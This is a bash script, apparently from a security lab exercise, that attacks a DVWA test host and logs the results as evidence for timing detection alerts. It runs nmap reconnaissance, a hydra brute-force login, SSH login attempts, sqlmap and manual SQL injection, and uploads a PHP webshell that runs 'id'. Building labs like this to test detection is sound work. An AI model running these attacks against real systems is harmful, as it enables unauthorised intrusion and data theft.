#!/usr/bin/env bash
# Fase 2.6 — Los 4 ataques, lanzados desde Kali SOLO contra tiendacr-web (192.168.56.20).
# Requiere: source scripts/env.sh && source scripts/lib.sh && scripts/dvwa_setup.sh ya corrido.
set -uo pipefail
cd "$(dirname "$0")/../.."
mkdir -p evidencias/ataque{1,2,3,4}
PID=$(grep PHPSESSID /tmp/dvwa.cookies 2>/dev/null | awk '{print $7}')
[ -z "$PID" ] && { echo "Falta cookie DVWA. Corre scripts/dvwa_setup.sh primero."; exit 1; }

# A1 Reconocimiento (T1046/T1595)
STAMP | tee evidencias/ataque1/t0.txt
RK "sudo nmap -sS -sV -T4 -p 1-1000 $IP_WEB" | tee evidencias/ataque1/nmap.txt

# A2 Fuerza bruta login app (lista CORTA, sin carga) (T1110.001)
STAMP | tee evidencias/ataque2/t0.txt
RK "printf 'admin\n123456\nletmein\npassword\n' > /tmp/pw.txt; \
  hydra -l admin -P /tmp/pw.txt $IP_WEB http-get-form \
  \"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=$PID; security=low:F=incorrect\" -t 4" \
  | tee evidencias/ataque2/hydra.txt
# A2b: intentos SSH (demuestra que solo se aceptan llaves)
RK "for i in \$(seq 1 10); do ssh -o BatchMode=yes -o ConnectTimeout=3 falso@$IP_WEB true 2>/dev/null; done" || true

# A3 SQLi (T1190)
STAMP | tee evidencias/ataque3/t0.txt
RK "sqlmap -u \"http://$IP_WEB/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=$PID; security=low\" --batch --dbs" | tee evidencias/ataque3/sqlmap.txt
RK "curl -s --cookie 'PHPSESSID=$PID; security=low' \"http://$IP_WEB/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit\"" | tee evidencias/ataque3/sqli_manual.txt

# A4 Webshell INOFENSIVO (solo imprime id) tras upload -> dispara FIM (T1505.003)
STAMP | tee evidencias/ataque4/t0.txt
RK "echo '<?php echo shell_exec(\"id\"); ?>' > /tmp/shell.php; \
  curl -s --cookie 'PHPSESSID=$PID; security=low' -F 'MAX_FILE_SIZE=100000' \
  -F 'uploaded=@/tmp/shell.php' -F 'Upload=Upload' http://$IP_WEB/vulnerabilities/upload/" | tee evidencias/ataque4/upload.txt
RK "curl -s http://$IP_WEB/hackable/uploads/shell.php" | tee evidencias/ataque4/shell_exec.txt
# Limpieza: el webshell se borra (prueba controlada)
R "$IP_WEB" 'sudo rm -f /opt/tiendacr/uploads/shell.php' || true
echo "Ataques completados. Mide tiempos con scripts/tiempo_alerta.sh y llena la tabla 7.6."
